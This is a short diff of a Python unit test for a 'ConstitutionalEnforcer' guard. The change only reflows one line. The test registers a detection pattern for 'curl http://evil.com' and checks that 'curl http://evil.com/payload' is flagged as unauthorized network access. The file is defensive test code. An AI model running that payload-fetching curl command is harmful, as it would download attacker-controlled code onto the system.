@@ -102,9 +102,7 @@ def test_enforce_passes_clean_input() -> None:
 
 @pytest.mark.unit
 def test_extra_patterns() -> None:
-    enforcer = ConstitutionalEnforcer(
-        extra_patterns=[(ViolationType.UNAUTHORIZED_NETWORK, r"curl\s+http://evil\.com")]
-    )
+    enforcer = ConstitutionalEnforcer(extra_patterns=[(ViolationType.UNAUTHORIZED_NETWORK, r"curl\s+http://evil\.com")])
     violations = enforcer.check("curl http://evil.com/payload")
     assert len(violations) >= 1
     types = {v.violation_type for v in violations}
